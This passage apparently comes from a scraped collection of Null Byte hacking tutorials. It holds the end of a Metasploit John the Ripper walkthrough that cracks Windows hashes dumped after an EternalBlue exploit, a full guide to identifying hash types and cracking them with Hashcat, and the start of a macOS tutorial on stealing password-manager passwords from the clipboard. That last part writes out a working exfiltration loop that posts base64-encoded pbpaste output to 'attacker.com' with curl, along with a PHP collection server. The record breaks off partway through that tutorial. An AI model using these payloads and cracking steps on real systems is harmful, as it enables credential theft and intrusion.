261783C/s PLANAR..VAGRANT\nSession completed\n[*] Cracking lm hashes in single mode...\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nWarning: poor OpenMP scalability for this hash type, consider --fork=4\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:04 DONE (2019-06-27 12:16) 0g/s 2527Kp/s 2527Kc/s 2527KC/s LLB1903..E1900\nSession completed\n[*] Cracking lm hashes in incremental mode (Digits)...\nUsing default input encoding: UTF-8\nUsing default target encoding: CP850\nWarning: poor OpenMP scalability for this hash type, consider --fork=4\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2019-06-27 12:16) 0g/s 13386Kp/s 13386Kc/s 13386KC/s 0766269..0769743\nSession completed\n[*] Cracked Passwords this run:\n[*] Cracking nt hashes in normal wordlist mode...\nUsing default input encoding: UTF-8\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:00 DONE (2019-06-27 12:16) 0g/s 959350p/s 959350c/s 1918KC/s yesenia..yodelli\nSession completed\n[*] Cracking nt hashes in single mode...\nUsing default input encoding: UTF-8\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\n1g 0:00:00:07 DONE (2019-06-27 12:17) 0.1253g/s 8097Kp/s 8097Kc/s 11648KC/s yellowy1900..yodelli1900\nWarning: passwords printed above might not be all those cracked\nUse the \"--show --format=NT\" options to display all of the cracked passwords reliably\nSession completed\n[*] Cracking nt hashes in incremental mode (Digits)...\nUsing default input encoding: UTF-8\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:05 DONE (2019-06-27 12:17) 0g/s 20885Kp/s 20885Kc/s 20885KC/s 73673920..73673952\nSession completed\nWe can see it starts out by attempting to crack any LM hashes, first in wordlist mode, followed by single-mode, and finally, incremental mode. Next, it follows the same procedure for any NT hashes that are present. Once it completes, it shows us any cracked passwords that it uncovered, along with the associated username:\n[*] Cracked Passwords this run:\n[+] admin2:tequila99\n[-] Auxiliary failed: KeyError key not found: :address\n[-] Call stack:\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit/credential/creation.rb:551:in `fetch'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit/credential/creation.rb:551:in `create_credential_service'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit/credential/creation.rb:301:in `block in create_credential_login'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit/credential/creation.rb:621:in `retry_transaction'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/metasploit-credential-3.0.3/lib/metasploit/credential/creation.rb:300:in `create_credential_login'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/credential_data_proxy.rb:27:in `block (2 levels) in create_cracked_credential'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activerecord-4.2.11.1/lib/active_record/relation/delegation.rb:46:in `each'\n[-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activerecord-4.2.11.1/lib/active_record/relation/delegation.rb:46:in `each'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/credential_data_proxy.rb:25:in `block in create_cracked_credential'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:166:in `data_service_operation'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/credential_data_proxy.rb:15:in `create_cracked_credential'\n[-]   /usr/share/metasploit-framework/lib/msf/core/auxiliary/report.rb:26:in `create_cracked_credential'\n[-]   /usr/share/metasploit-framework/modules/auxiliary/analyze/jtr_windows_fast.rb:127:in `block (2 levels) in run'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/jtr/cracker.rb:173:in `block (2 levels) in each_cracked_password'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/jtr/cracker.rb:172:in `each_line'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/jtr/cracker.rb:172:in `block in each_cracked_password'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/jtr/cracker.rb:171:in `popen'\n[-]   /usr/share/metasploit-framework/lib/metasploit/framework/jtr/cracker.rb:171:in `each_cracked_password'\n[-]   /usr/share/metasploit-framework/modules/auxiliary/analyze/jtr_windows_fast.rb:90:in `block in run'\n[-]   /usr/share/metasploit-framework/modules/auxiliary/analyze/jtr_windows_fast.rb:46:in `each'\n[-]   /usr/share/metasploit-framework/modules/auxiliary/analyze/jtr_windows_fast.rb:46:in `run'\n[*] Auxiliary module execution completed\nAs an added bonus, when we use the creds command to view stored credentials in our database, we can now see the plaintext password is included:\nmsf5 auxiliary(analyze/jtr_windows_fast) > creds\nCredentials\n===========\nhost         origin       service        public         private                                                            realm  private_type  JtR Format\n----         ------       -------        ------         -------                                                            -----  ------------  ----------\nadmin2         tequila99                                                                 Password\n10.10.0.104  10.10.0.104  445/tcp (smb)  guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm\n10.10.0.104  10.10.0.104  445/tcp (smb)  administrator  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm\n10.10.0.104  10.10.0.104  445/tcp (smb)  admin2         aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7         NTLM hash     nt,lm\nWrapping Up\nIn this tutorial, we learned about Metasploit's John the Ripper module and how to use it to quickly crack Windows hashes. We first exploited the target using EternalBlue and used the hashdump post module to grab user hashes and store them to the database. Then, we ran the JTR module right in Metasploit and cracked the hash of one of the users. Metasploit's JTR module makes it easy to obtain weak passwords in very little time, and it should be worth a shot in any Windows post-exploitation campaign.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Martin Lopez/Pexels; Screenshots by drd_/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Use Hash-Identifier to Determine Hash Types for Password Cracking",
        "link": "https://null-byte.wonderhowto.com/how-to/use-hash-identifier-determine-hash-types-for-password-cracking-0200447/",
        "content": "* WonderHowTo\nHashes are commonly used to store sensitive information like credentials to avoid storing them in plaintext. With tools like Hashcat, it's possible to crack these hashes, but only if we know the algorithm used to generate the hash. Using a tool called hash-identifier, we can easily fingerprint any hashes to discover the right Hashcat mode to use to retrieve a password.\nAside from cracking hashes, hash-identifier is also helpful for identifying which hashing algorithm is being used to provide a checksum value for a download. And it can be used to determine what program a hashed file or value may belong to, such as an SQL database or another vendor-specific format.\nWhat Is a Hash & How Do We Crack It?\nWhen passwords are lifted from a database or computer, they're usually stored as hashes so that hackers can't read any passwords in plaintext. A hashing function turns the readable passwords into jumbled up messes of letters and numbers that should not be able to be reverse-engineered.\n* Don't Miss: Cracking WPA2 Passwords Using a PMKID Hashcat Attack\nBut two or more of the same passwords using the same hashing function will have the same hash, so one could determine the hashes for an entire password list using that hashing function, then use that data to determine the matching password. And that's what a lot of password-cracking tools do.\nWhile hashes are better than storing a password in plaintext, they can still be cracked if a good rule or password list is used with Hashcat or another cracking program. But you can't just point Hashcat at any hash and expect it to work. Imagine Hashcat as a drill with many different sized bits. For each type of hash we want to crack, we need to attach a different \"bit\" to Hashcat by setting it to the correct mode to attack the target hash.\nIf you work with hashes a lot, it might be easy to spot the difference between types of hashes that are commonly used.\nAt a glance, can you tell which of these two common hashes is which?\n8743b52063cd84097a65d1633f5c74f5\nb89eaac7e61417341b710b727768294d0e6a277b\nAlthough you may have seen both before, it may not be immediately obvious which of these hashes is MD5 and which is SHA1. It can get even more confusing with similar hash types that have different mode numbers in Hashcat. In the case of the hashes above, it makes a big difference which is which.\nWhen using Hashcat to crack this hash, we have to set the -m option to the correct mode. To crack an MD5 hash, we'd use the mode number 0 to get the hash.\n~$ sudo hashcat -m 0 -a 0 8743b52063cd84097a65d1633f5c74f5 example.dict --force\nhashcat (v4.0.1) starting...\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-Intel(R) Core(TM)2 Duo CPU     E7500  @ 2.93GHz, 1024/3639 MB allocatable, 2MCU\n8743b52063cd84097a65d1633f5c74f5:hashcat\nHere, we found that the hash was made with the word \"hashcat\" by correctly identifying it as MD5 and using a good wordlist.\nRecommended on Amazon: \"Hash Crack: Password Cracking Manual\" by Joshua Picolet\nWhat Hashes Are Supported?\nAt present, a large amount of the hashes that Hashcat is capable of cracking can be identified. On the GitHub repository for hash-identifier, the list of the hashes supported is quite extensive.\nEncryption formats supported:\nCRC-16-CCITT\nDomain Cached Credentials\nGOST R 34.11-94\nHaval-192 110080\nHaval-224 114080\nLineage II C4\nMD5 ($pass.$salt) - Joomla\nMD5 (HMAC(Wordpress))\nMD5 (Middle)\nMD5 (phpBB3)\nMD5 (Wordpress)\nMySQL 160bit - SHA-1(SHA-1($pass))\nMySQL5 - SHA-1(SHA-1($pass))\nRAdmin v2.x\nSAM - (LM_hash:NT_hash)\nSHA-1 (Django)\nSHA-1 (MaNGOS)\nSHA-256 (Django)\nSHA-384 (Django)\nWhat You'll Need\nTo follow this guide, you'll need Python3 installed on your computer (it's cross-platform), so get that before continuing if you don't already have it. You'll also need Hashcat, which you can download by running apt install hashcat after updating your computer with apt update and apt upgrade.\nIf you want to generate some of your own hashes to try cracking, you can do so with the format echo -n PLAINTEXT | (HASHTYPE)sum. To create a SHA1 hash of the word \"nullbyte, I would use the following command.\n~$ echo -n nullbyte | sha1sum\n32c0ced56f1fe08583bdb079d85a35a81995018c  -\nStep 1: Download & Install Hash-Identifier\nInstalling the Python script is really easy. To start, open a terminal window and run the following command.\n~$ git clone https://github.com/blackploit/hash-identifier.git\nCloning into 'hash-identifier'...\nremote: Enumerating objects: 21, done.\nremote: Total 21 (delta 0), reused 0 (delta 0), pack-reused 21\nUnpacking objects: 100% (21/21), done.\nThen, navigate to its directory with cd hash-identifier and list its contents with ls.\n~$ cd hash-identifier\n~/hash-identifier$ ls\nhash-id.py  README.md  screenshots\nYou should see a file called hash-id.py, which you can run with the command below to start.\n~/hash-identifier$ python3 hash-id.py\n#########################################################################\n#     __  __                     __           ______    _____           #\n#    /\\ \\/\\ \\                   /\\ \\         /\\__  _\\  /\\  _ `\\         #\n#    \\ \\ \\_\\ \\     __      ____ \\ \\ \\___     \\/_/\\ \\/  \\ \\ \\/\\ \\        #\n#     \\ \\  _  \\  /'__`\\   / ,__\\ \\ \\  _ `\\      \\ \\ \\   \\ \\ \\ \\ \\       #\n#      \\ \\ \\ \\ \\/\\ \\_\\ \\_/\\__, `\\ \\ \\ \\ \\ \\      \\_\\ \\__ \\ \\ \\_\\ \\      #\n#       \\ \\_\\ \\_\\ \\___ \\_\\/\\____/  \\ \\_\\ \\_\\     /\\_____\\ \\ \\____/      #\n#        \\/_/\\/_/\\/__/\\/_/\\/___/    \\/_/\\/_/     \\/_____/  \\/___/  v1.2 #\n#                                                             By Zion3R #\n#                                                    www.Blackploit.com #\n#                                                   Root@Blackploit.com #\n#########################################################################\n--------------------------------------------------\nStep 2: Fingerprint Unknown Hashes\nTo try out hash-identifier, we'll be looking at trying to fingerprint the following five unknown hashes.\nHash 1: 7196759210defdc0\nHash 2: 1bbb234c81ef04a1c2f441253952a556276669d7fc9d1ee765bd4b18f796699d (256)\nHash 3: 32c0ced56f1fe08583bdb079d85a35a81995018c (1)\nHash 4: 753b27807b690ef889a259f3b219e024bf5c6c33c8d56116943d9285a0b55b2050981f29e6fafa660428c48d7db3c4bd2e8dd48f87c8e90bde5e0c82ed23be10 (512)\nHash 5: 5f804b61f8dcf70044ad8c1385e946a8 (md5)\nTo get started, let's enter the first into the waiting hash-identifier command prompt. As you can see, it yields a quick ID as a MySQL hash. This is the one we'll try to crack, so we'll return to it later.\nHASH: 7196759210defdc0\nPossible Hashs:\n[+] MD5(Middle)\nLeast Possible Hashs:\n[+] MD5(Half)\nOur second hash, seen below, is identified as a SHA256 hash, with Haval256 being another possibility.\nHASH: 1bbb234c81ef04a1c2f441253952a556276669d7fc9d1ee765bd4b18f796699d\nPossible Hashs:\n[+] SHA-256\n[+] Haval-256\nLeast Possible Hashs:\n[+] GOST R 34.11-94\n[+] RipeMD-256\n[+] SNEFRU-256\n[+] SHA-256(HMAC)\n[+] Haval-256(HMAC)\n[+] RipeMD-256(HMAC)\n[+] SNEFRU-256(HMAC)\n[+] SHA-256(md5($pass))\n[+] SHA-256(sha1($pass))\nOur third hash is identified as SHA1:\nHASH: 32c0ced56f1fe08583bdb079d85a35a81995018c\nPossible Hashs:\n[+] MySQL5 - SHA-1(SHA-1($pass))\nLeast Possible Hashs:\n[+] Tiger-160\n[+] Haval-160\n[+] RipeMD-160\n[+] SHA-1(HMAC)\n[+] Tiger-160(HMAC)\n[+] RipeMD-160(HMAC)\n[+] Haval-160(HMAC)\n[+] SHA-1(MaNGOS)\n[+] SHA-1(MaNGOS2)\n[+] sha1($pass.$salt)\n[+] sha1($salt.$pass)\n[+] sha1($salt.md5($pass))\n[+] sha1($salt.md5($pass).$salt)\n[+] sha1($salt.sha1($pass))\n[+] sha1($salt.sha1($salt.sha1($pass)))\n[+] sha1($username.$pass)\n[+] sha1($username.$pass.$salt)\n[+] sha1(md5($pass))\n[+] sha1(md5($pass).$salt)\n[+] sha1(md5(sha1($pass)))\n[+] sha1(sha1($pass))\n[+] sha1(sha1($pass).$salt)\n[+] sha1(sha1($pass).substr($pass,0,3))\n[+] sha1(sha1($salt.$pass))\n[+] sha1(sha1(sha1($pass)))\n[+] sha1(strtolower($username).$pass)\nAnd our fourth hash is identified as SHA512:\nHASH: 753b27807b690ef889a259f3b219e024bf5c6c33c8d56116943d9285a0b55b2050981f29e6fafa660428c48d7db3c4bd2e8dd48f87c8e90bde5e0c82ed23be10\nPossible Hashs:\n[+] SHA-512\n[+] Whirlpool\nLeast Possible Hashs:\n[+] SHA-512(HMAC)\n[+] Whirlpool(HMAC)\nFinally, our last hash is identified as MD5:\nHASH: 5f804b61f8dcf70044ad8c1385e946a8\nPossible Hashs:\n[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\nLeast Possible Hashs:\n[+] RAdmin v2.x\n[+] MD5(HMAC)\n[+] MD4(HMAC)\n[+] MD2(HMAC)\n[+] MD5(HMAC(Wordpress))\n[+] Haval-128\n[+] Haval-128(HMAC)\n[+] RipeMD-128\n[+] RipeMD-128(HMAC)\n[+] SNEFRU-128\n[+] SNEFRU-128(HMAC)\n[+] Tiger-128\n[+] Tiger-128(HMAC)\n[+] md5($pass.$salt)\n[+] md5($salt.$pass)\n[+] md5($salt.$pass.$salt)\n[+] md5($salt.$pass.$username)\n[+] md5($salt.md5($pass))\n[+] md5($salt.md5($pass))\n[+] md5($salt.md5($pass.$salt))\n[+] md5($salt.md5($pass.$salt))\n[+] md5($salt.md5($salt.$pass))\n[+] md5($salt.md5(md5($pass).$salt))\n[+] md5($username.0.$pass)\n[+] md5($username.LF.$pass)\n[+] md5($username.md5($pass).$salt)\n[+] md5(md5($pass))\n[+] md5(md5($pass).$salt)\n[+] md5(md5($pass).md5($salt))\n[+] md5(md5($salt).$pass)\n[+] md5(md5($salt).md5($pass))\n[+] md5(md5($username.$pass).$salt)\n[+] md5(md5(md5($pass)))\n[+] md5(md5(md5(md5($pass))))\n[+] md5(md5(md5(md5(md5($pass)))))\n[+] md5(sha1($pass))\n[+] md5(sha1(md5($pass)))\n[+] md5(sha1(md5(sha1($pass))))\n[+] md5(strtoupper(md5($pass)))\nThat was easy, but the next step is actually attacking these hashes by converting the identified hash type into a Hashcat mode number.\nStep 3: Look Up Hashcat Hash Modes\nTo look up a hash mode, we can take a look at the exhaustive list of Hashcat supported hash types on the Hashcat examples page. An abbreviated list of some of the most popular hashes is below.\n* Don't Miss: Crack Shadow Hashes After Getting Root on a Linux System\nHash-Mode   Hash-Name                   Example\n0           MD5                         8743b52063cd84097a65d1633f5c74f5\n10          md5($pass.$salt)            01dfae6e5d4d90d9892622325959afbe:7050461\n20          md5($salt.$pass)            f0fda58630310a6dd91a7d8f0a4ceda2:4225637426\n30          md5(utf16le($pass).$salt)   b31d032cfdcf47a399990a71e43c5d2a:144816\n40          md5($salt.utf16le($pass))   d63d0e21fdc05f618d55ef306c54af82:13288442151473\n50          HMAC-MD5 (key = $pass)      fc741db0a2968c39d9c2a5cc75b05370:1234\n60          HMAC-MD5 (key = $salt)      bfd280436f45fa38eaacac3b00518f29:1234\n100         SHA1                        b89eaac7e61417341b710b727768294d0e6a277b\n110         sha1($pass.$salt)           2fc5a684737ce1bf7b3b239df432416e0dd07357:2014\n120         sha1($salt.$pass)           cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024\n130         sha1(utf16le($pass).$salt)  c57f6ac1b71f45a07dbd91a59fa47c23abcd87c2:631225\n140         sha1($salt.utf16le($pass))  5db61e4cd8776c7969cfd62456da639a4c87683a:8763434884872\n150         HMAC-SHA1 (key = $pass)     c898896f3f70f61bc3fb19bef222aa860e5ea717:1234\n160         HMAC-SHA1 (key = $salt)     d89c92b4400b15c39e462a8caa939ab40c3aeeea:1234\n200         MySQL323                    1EAFFED54F552AA5\n300         MySQL4.1/MySQL5             fcf7c1b8749cf99d88e5f34271d636178fb5d130\nAbove, we can see two examples that might be a match for our first hash (7196759210defdc0) from the previous step. At a glance, the mode 200 \"MySQL323\" seems like the best match, but we can confirm it by running the example hash through hash-identifier.\nHASH: 1EAFFED54F552AA5\nPossible Hashs:\n[+] MD5(Middle)\nLeast Possible Hashs:\n[+] MD5(Half)\nIt's an exact match to our sample hash:\nHASH: 7196759210defdc0\nPossible Hashs:\n[+] MD5(Middle)\nLeast Possible Hashs:\n[+] MD5(Half)\nIf we run the other possibly-matching MySQL hash type, mode 300, we can see it doesn't match the fingerprint of our unknown sample.\nHASH: fcf7c1b8749cf99d88e5f34271d636178fb5d130\nPossible Hashs:\n[+] MySQL5 - SHA-1(SHA-1($pass))\nLeast Possible Hashs:\n[+] Tiger-160\n[+] Haval-160\n[+] RipeMD-160\n[+] SHA-1(HMAC)\n[+] Tiger-160(HMAC)\n[+] RipeMD-160(HMAC)\n[+] Haval-160(HMAC)\n[+] SHA-1(MaNGOS)\n[+] SHA-1(MaNGOS2)\n[+] sha1($pass.$salt)\n[+] sha1($salt.$pass)\n[+] sha1($salt.md5($pass))\n[+] sha1($salt.md5($pass).$salt)\n[+] sha1($salt.sha1($pass))\n[+] sha1($salt.sha1($salt.sha1($pass)))\n[+] sha1($username.$pass)\n[+] sha1($username.$pass.$salt)\n[+] sha1(md5($pass))\n[+] sha1(md5($pass).$salt)\n[+] sha1(md5(sha1($pass)))\n[+] sha1(sha1($pass))\n[+] sha1(sha1($pass).$salt)\n[+] sha1(sha1($pass).substr($pass,0,3))\n[+] sha1(sha1($salt.$pass))\n[+] sha1(sha1(sha1($pass)))\n[+] sha1(strtolower($username).$pass)\nThat proves that we've identified the correct Hashcat mode number, 200, to use in our Hashcat attack.\nStep 4: Attack the Hash with Hashcat\nOnce we know the mode to use by identifying the hash, we can attack it using Hashcat. For it to work, we'll need to create a dictionary file with passwords on it, which Hashcat will then use to attack the hash. There are many available lists online like RockYou but, in this case, we'll be creating one called example.dict to put some password guesses in.\nIf you're still in the hash-identifier tool, hit Control-C on your keyboard first. Then, create and open a file in nano by typing the following.\n~/hash-identifier$ nano example.dict\nAfter adding some password guesses that include the word \"hashcat\" for this example, hit Control-X to exit, then Y, and confirm the filename. We can now use this file as our list of plaintext guesses, along with the mode we discovered, to crack the hash. The basic formula we will use will look like this:\nsudo hashcat -m MODE_NUMBER -a 0 HASH_VALUE example.dict\nWhen we run it with our hash of 7196759210defdc0 (the \"HASH_VALUE\") with our mode of 200 (the \"MODE_NUMBER\"), the results should look like below. If you have an older system like the example one I'm using, you may need to use the --force command with it.\n~/hash-identifier$ sudo hashcat -m 200 -a 0 7196759210defdc0 example.dict --force\nhashcat (v5.1.0) starting...\nOpenCL Platform #1: The pocl project\n====================================\n* Device #1: pthread-Intel(R) Core(TM)2 Duo CPU     E7500  @ 2.93GHz, 1024/3639 MB allocatable, 2MCU\n/usr/share/hashcat/OpenCL/m00200_a0-optimized.cl: Pure OpenCL kernel not found, falling back to optimized OpenCL kernel\nHashes: 1 digests; 1 unique digests, 1 unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\nApplicable optimizers:\n* Optimized-Kernel\n* Zero-Byte\n* Not-Iterated\n* Single-Hash\n* Single-Salt\nPassword length minimum: 0\nPassword length maximum: 31\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\nWatchdog: Temperature retain trigger disabled.\n* Device #1: build_opts '-I /usr/share/hashcat/OpenCL -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=200 -D _unroll'\n* Device #1: Kernel m00200_a0-optimized.44d10a8c.kernel not found in cache! Building may take a while...\nDictionary cache hit:\n* Filename..: example.dict\n* Passwords.: 17\n* Bytes.....: 76\n* Keyspace..: 17\n- Device #1: autotuned kernel-accel to 1024\n- Device #1: autotuned kernel-loops to 1\n[s]tatus [p]ause [r]esume [b]ypass [c]heckpoint [q]uit => The wordlist or mask that you are using is too small.\nThis means that hashcat cannot use the full parallel power of your device(s).\nUnless you supply more work, your cracking speed will drop.\nFor tips on supplying more work, see: https://hashcat.net/faq/morework\nApproaching final keyspace - workload adjusted.\n7196759210defdc0:hashcat\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: MySQL323\nHash.Target......: 7196759210defdc0\nTime.Started.....: Mon Dec  9 17:00:25 2019 (0 secs)\nTime.Estimated...: Mon Dec  9 17:00:25 2019 (0 secs)\nGuess.Base.......: File (example.dict)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.Dev.#1.....:        0 H/s (0.03ms)\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 17/17 (100.00%)\nRejected.........: 0/17 (0.00%)\nRestore.Point....: 0/17 (0.00%)\nCandidates.#1....: wow -> again\nHWMon.Dev.#1.....: N/A\nStarted: Mon Dec  9 17:00:17 2019\nStopped: Mon Dec  9 17:00:27 2019\nThere we go! We get the output of 7196759210defdc0:hashcat, meaning we found the value of the MySQL323 hash to be the word \"hashcat\" by comparing it through all the words in the example.dict file.\nHash-Identifier Makes Fingerprinting Hashes Easy\nWhenever you're dealing with an unknown type of hash, the first step to making it useful is identifying it correctly. While hash-identifier isn't a perfect tool, it's an easy way of spotting most hashes and distinguishing between several types of common and similar-looking hashes that have a different mode in Hashcat. Even if hash-identifier isn't sure what kind of hash you're dealing with, comparing the response of example hashes from the Hashcat website can help you verify that you've found the right hash.\nI hope you enjoyed this guide to fingerprinting unknown hashes! If you have any questions about this tutorial on hash cracking and identification or you have a comment, ask below or feel free to reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by Kody/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "How to Dump 1Password, KeePassX & LastPass Passwords in Plaintext",
        "link": "https://null-byte.wonderhowto.com/how-to/hacking-macos-dump-1password-keepassx-lastpass-passwords-plaintext-0198550/",
        "content": "* WonderHowTo\nKeePassX, 1Password, and LastPass are effective against keyloggers, phishing, and database breaches, but passwords managers rely on the operating system's clipboard to securely move credentials from the password vault to the web browser. It's within these few seconds that an attacker can dump the clipboard contents and exfiltrate passwords.\nTwo scenarios come to mind with a clipboard-dumping attack geared toward password managers, and both utilize the pbpaste command found in all versions of macOS. Pbpaste will take any data found in the clipboard (including passwords) and write it to the standard output. Any macOS user can try this by first copying a password to the clipboard then immediately typing pbpaste into a terminal.\nIt doesn't require special privileges to execute pbpaste, and the clipboard can be written to any file, as shown below. This affects KeePassX, 1Password, LastPass, and even Apple's own built-in iCloud Keychain password manager.\n~$ pbpaste >>/tmp/clipboard.txt\nOption 1: Dump the Clipboard Locally\nScenario: The attacker has established a persistent backdoor and wants to gather passwords stored in KeePassX, 1Password, or LastPass over a prolonged period. MacOS has become better about protecting against keyloggers, and anyone livestreaming the desktop couldn't unhide or reveal credentials stored in the password managers.\nThe attacker can dump the clipboard into a local file and occasionally check it for new passwords. An infinite while loop with a five second delay should do the trick.\n~$ while true; do echo -e \"\\n$(pbpaste)\" >>/tmp/clipboard.txt && sleep 5; done\nThe while loop will execute pbpaste and pause (sleep) for five seconds. The command within the loop will repeat over and over again, repeatedly dumping anything found in the clipboard. An echo has been introduced to create a newline (\\n) with every entry to prevent data from concatenating on the same line.\nFrom an additional Netcat shell, use cat or tail to view the clipboard.txt file contents.\n~$ tail -f /tmp/clipboard.txt\nTail will follow (-f) changes appended to the file and immediately print new content discovered in the clipboard.\nPrevent the clipboard.txt file from flooding with duplicate lines by evaluating the clipboard contents and comparing it to the last entry in the file.\n~$ while true; do if [[ \"$(pbpaste)\" != \"$(tail -n1 /tmp/clipboard.txt)\" ]]; then echo -e \"\\n$(pbpaste)\" >>/tmp/clipboard.txt; fi && sleep 5;done\nOnly if the current clipboard content is not equal (!=) to the last entry (tail -n1) in clipboard.txt will pbpaste update the file.\nHowever, this solution is somewhat flawed. The if statement only compares the last line of the clipboard.txt file, so if there are multiple lines in the clipboard it'll fail to recognize it as a duplicate entry. But it serves its purpose for this article and most scenarios. You can spend a little time devising a robust, proper solution with this as the basic foundation.\nOption 2: Exfiltrate Passwords to a Remote Server\nScenario: The attacker doesn't care to remotely access the MacBook. The payload is instead designed to exfiltrate the clipboard to the attacker's server at intervals.\nIn this scenario, the attacker only cares about exfiltrating the clipboard and hasn't backdoored the MacBook. Instead, they have found a way to remotely execute code on the target macOS device. Setting up this attack involves a PHP server controlled by the attacker used to intercept exfiltrated data. A Debian virtual private server is used in my example.\nStep 1: Install PHP\nTo get started, install php with the following apt-get command, which will work in Debian and Kali Linux.\n~# apt-get update && apt-get install php\nIgn:1 http://http.us.debian.org/debian stretch InRelease\nHit:2 http://http.us.debian.org/debian stretch-updates InRelease\nHit:3 http://security.debian.org/debian-security stretch/updates InRelease\nHit:4 http://http.us.debian.org/debian stretch Release\nReading package lists... Done\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following NEW packages will be installed:\napache2-bin libapache2-mod-php7.0 libapr1 libaprutil1 libaprutil1-dbd-sqlite3 libaprutil1-ldap liblua5.2-0 php\nphp-common php7.0 php7.0-cli php7.0-common php7.0-json php7.0-opcache php7.0-readline psmisc\n0 upgraded, 16 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 5,209 kB of archives.\nAfter this operation, 19.9 MB of additional disk space will be used.\nDo you want to continue? [Y/n]\nMake a directory called \"phpServer/\" using the below mkdir command.\n~# mkdir phpServer/\nChange into the phpServer/ directory using the cd command.\n~# cd phpServer/\nCreate a file called \"index.php\" with nano.\n~/phpServer# nano index.php\nPaste the below PHP code into the nano terminal. Once that's done, to save and exit the nano terminal, press Ctrl+x, then y, then Enter.\n$input = file_get_contents(\"php://input\");\n$log = file_put_contents('clipboard.txt', $input.PHP_EOL , FILE_APPEND | LOCK_EX);\nThis simple PHP server is capable of intercepting data and doesn't need to be modified in any way to function. When the MacBook sends the clipboard contents, the server will capture and append the data to a file called \"clipboard.txt.\"\nFinally, start the PHP server with the php -S 0.0.0.0:80 command.\n~/phpServer# php -S 0.0.0.0:80\nPHP 7.0.33-0+deb9u3 Development Server started at Sun Jun  9 08:38:55 2019\nListening on http://0.0.0.0:80\nDocument root is /root/phpServer\nPress Ctrl-C to quit.\nStep 2: Create the Payload\nThe below script will compare the current clipboard contents to the most recent sent to the attacker's server. For clarity, it's in standard shell script format to allow space for comments.\n# While loop to dump the clipboard over and over again, infinitely.\nwhile true; do\n# An `if` statement, compares the current clipboard\n# content to the content found in the last loop.\nif [[ \"$(pbpaste)\" != \"$pbpaste_last\" ]]; then\n# A `p` to store the encoded clipboard contents. The\n# contents must be encoded before sending to the\n# attacker's server to prevent it from breaking the\n# proceeding curl command.\np=\"$(echo $(pbpaste) | base64)\"\n# Curl takes the encoded string and delivers it to\n# the attacker's server via POST request.\ncurl --data \"$p\" -X POST 'http://attacker.com/'\n# The `pbpaste_last` variable is updated. This variable\n# is evaluated in the following loop.\npbpaste_last=\"$(pbpaste)\"\n# Delay for 5 seconds before checking the clipboard\n# for new contents. Decreasing this value will cause\n# the script to evaluate the clipboard more frequently,\n# but will have a negative impact on the MacBook's\n# CPU. Increasing the value may cause the script to\n# miss a valuable password. Adjust as needed.\nCompress the script into one line to have it fit conveniently into various types of stagers.\nwhile true; do if [[ \"$(pbpaste)\" != \"$pbpaste_last\" ]]; then p=\"$(echo $(pbpaste) | base64)\"; curl --data \"$p\" -X POST 'http://attacker.com/' && pbpaste_last=\"$(pbpaste)\"; sleep 5; fi; done\nStep 3: Examine the Exfiltrated Data\nAs the PHP server receives clipboard data, it will indicate the origin of the data (IP address) as well as the date and time. Press Ctrl+c to stop the PHP server.\nPHP 7.0.33-0+deb9u3 Development 